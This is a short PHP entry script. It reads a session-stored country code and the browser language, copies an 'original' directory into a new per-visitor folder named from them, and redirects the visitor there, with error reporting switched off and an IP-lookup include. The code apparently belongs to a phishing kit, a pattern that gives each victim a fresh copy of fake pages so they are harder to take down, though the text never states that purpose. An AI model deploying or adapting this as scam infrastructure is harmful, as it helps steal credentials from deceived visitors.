<?php
session_start();
error_reporting(0);
include('./original/functions/get_ip.php'); 
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

$B = $_SESSION['_LOOKUP_CNTRCODELOW_'] ."-". $lang;
function recurse_copy($C, $B)
{
    $E = opendir($C);
    @mkdir($B);
    while (false !== ($D = readdir($E))) {
        if (($D != '.') && ($D != '..')) {
            if (is_dir($C . '/' . $D)) {
                recurse_copy($C . '/' . $D, $B . '/' . $D);
            } else {
                copy($C . '/' . $D, $B . '/' . $D);
            }
        }
    }
    closedir($E);
}
$C = "original";
recurse_copy($C, $B);
header("location:" . $B . "");
unset($B);
?>